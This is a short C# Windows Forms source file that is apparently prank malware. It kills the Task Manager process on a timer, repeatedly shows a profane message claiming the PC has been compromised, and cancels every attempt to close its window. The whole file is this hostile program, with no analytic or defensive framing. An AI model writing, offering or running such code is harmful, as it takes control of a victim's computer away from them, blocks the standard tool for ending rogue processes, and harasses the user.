using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Diagnostics;

namespace O_O
{
	public partial class Form1 : Form
	{
		public Form1()
		{
			InitializeComponent();
		}

		private void timer1_Tick(object sender, EventArgs e)
		{
			Process[] p = Process.GetProcessesByName("taskmgr");
			if (p.Length > 0)
			{
				p[0].Kill();
			}
		}

		private void timer2_Tick(object sender, EventArgs e)
		{
			MessageBox.Show("I fucked your pc");
		}

		private void Form1_FormClosing(object sender, FormClosingEventArgs e)
		{
			e.Cancel = true;
		}
	}
}
